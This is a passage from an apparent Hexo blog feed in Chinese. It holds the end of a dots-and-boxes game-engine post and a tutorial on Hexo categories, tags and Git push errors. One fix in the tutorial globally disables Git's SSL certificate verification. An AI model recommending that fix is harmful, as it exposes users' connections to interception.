390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2483,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(3229.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4285.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mtext" transform="translate(4785.6,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mn" transform="translate(5035.6,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g><g data-mml-node="mo" transform="translate(5535.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g></g><g data-mml-node="mtd" transform="translate(25552.2,0)"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(298,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(783,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1268,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(1771,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(2517.8,0)"><path data-c="2260" d="M166 -215T159 -215T147 -212T141 -204T139 -197Q139 -190 144 -183L306 133H70Q56 140 56 153Q56 168 72 173H327L406 327H72Q56 332 56 347Q56 360 70 367H426Q597 702 602 707Q605 716 618 716Q625 716 630 712T636 703T638 696Q638 692 471 367H707Q722 359 722 347Q722 336 708 328L451 327L371 173H708Q722 163 722 153Q722 140 707 133H351Q175 -210 170 -212Q166 -215 159 -215Z"></path></g><g data-mml-node="mn" transform="translate(3573.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mtd" transform="translate(30625.8,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(433,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(1009,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(1538,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1883,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2483,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(3229.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4285.6,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mtext" transform="translate(4785.6,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mn" transform="translate(5035.6,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(5535.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g></g><g data-mml-node="mtd" transform="translate(37439.3,0)"><g data-mml-node="mi"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(485,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(846,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(1422,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(1888,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2339,0)"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="mi" transform="translate(3055,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(3400,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(3869,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(42274.3,0) translate(0 250)"></g></g></g></g></svg></mjx-container></p><h3 id="点格棋代码实现"><a href="#点格棋代码实现" class="headerlink" title="点格棋代码实现"></a>点格棋代码实现</h3><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><p>这个函数是博弈引擎与平台进行通信交互的主函数，具体逻辑如下：</p><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/Snipaste_2024-04-28_21-56-35.png" class=""><h4 id="主要行棋逻辑"><a href="#主要行棋逻辑" class="headerlink" title="主要行棋逻辑"></a>主要行棋逻辑</h4><p><code>MyMove()</code>函数主要是清理当前棋局，并产生走法，然后调用评估函数得到评分最大的走法</p><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/Snipaste_2024-06-09_15-06-01.png" class=""><h4 id="评估函数"><a href="#评估函数" class="headerlink" title="评估函数"></a>评估函数</h4><p>主要使用极大极小搜索，以及使用α&amp;β剪枝算法剪枝</p><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/Snipaste_2024-06-09_16-11-01.png" class="">]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>博弈论</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo个人博客写文章以及Git报错解决</title>
    <link href="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
    <url>/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>博客博客博客~~</p><span id="more"></span><h3 id="用Hexo写博客"><a href="#用Hexo写博客" class="headerlink" title="用Hexo写博客"></a>用Hexo写博客</h3><p>使用终端在命令行里创建一篇博客，然后会在目录<code>/source/_posts</code>下生成一个Markdown文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo new post blog_name<br></code></pre></td></tr></table></figure><img src="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/Snipaste_2023-08-10_09-50-25.png" class=""><img src="/2022/12/11/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/Snipaste_2023-08-10_09-54-25.png" class=""><p>现在开始编辑</p><h4 id="给文章添加“categories”属性"><a href="#给文章添加“categories”属性" class="headerlink" title="给文章添加“categories”属性"></a>给文章添加“categories”属性</h4><p>生成“分类”页并添加tpye属性,进入博客目录。执行命令下方命令</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> categories<br></code></pre></td></tr></table></figure><p>categories文件夹下会有index.md这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">categories</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>添加type: “categories”到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">分类</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-attr">type:</span> <span class="hljs-string">categories</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>保存并关闭文件。</p><p>给文章添加categories标签</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">个人博客写文章以及Git报错解决</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-attr">categories:</span> <span class="hljs-string">Github个人博客搭建和使用</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了<code>categories: xxx</code>的文章才会被收录到首页的“分类”中。</p><h4 id="给文章添加“tags”属性"><a href="#给文章添加“tags”属性" class="headerlink" title="给文章添加“tags”属性"></a>给文章添加“tags”属性</h4><p>生成“标签”页并添加tpye属性,进入博客目录。执行命令下方命令</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> tags<br></code></pre></td></tr></table></figure><p>categories文件夹下会有index.md这个文件，打开后默认内容是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">categories</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-9</span> <span class="hljs-number">19</span><span class="hljs-string">:46:40</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>添加type: “categories”到内容中，添加后是这样的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">标签</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-10 10:11:27</span><br><span class="hljs-attr">type:</span> <span class="hljs-string">tags</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>保存并关闭文件。</p><p>给文章添加tags标签</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">title: 个人博客写文章以及Git报错解决<br>date: 2023<span class="hljs-string">-08</span><span class="hljs-string">-10</span> 09:46:40<br>categories: Github个人博客搭建和使用<br><span class="hljs-keyword">tags:</span> [Github,博客搭建]<br></code></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了<code>tags: xxx</code>的文章才会被收录到首页的“标签”中。</p><h3 id="git提交文章报错"><a href="#git提交文章报错" class="headerlink" title="git提交文章报错"></a>git提交文章报错</h3><h4 id="OpenSSL-SSL-read-Connection-was-reset-errno-10054"><a href="#OpenSSL-SSL-read-Connection-was-reset-errno-10054" class="headerlink" title="OpenSSL SSL_read: Connection was reset, errno 10054"></a>OpenSSL SSL_read: Connection was reset, errno 10054</h4><p>在文件里<code>git bash here</code>，设置后关闭当前terminal窗口，重新打开再执行git操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.sslVerify "false" <br></code></pre></td></tr></table></figure><h4 id="Failed-to-connect-to-github-com-port-443-Operation-timed-out"><a href="#Failed-to-connect-to-github-com-port-443-Operation-timed-out" class="headerlink" title="Failed to connect to github.com port 443:Operation timed out"></a>Failed to connect to github.com port 443:Operation timed out</h4><p>​首先，你有全局的科学上网小猫猫，然后在git里执行更换代理即可，注意使用V2ray的默认端口是1080。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.proxy http://127.0.0.1:7890 <br>git config --global https.proxy http://127.0.0.1:7890<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Github博客搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在Github上搭建自己的个人博客</title>
    <link href="/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2022/12/09/%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
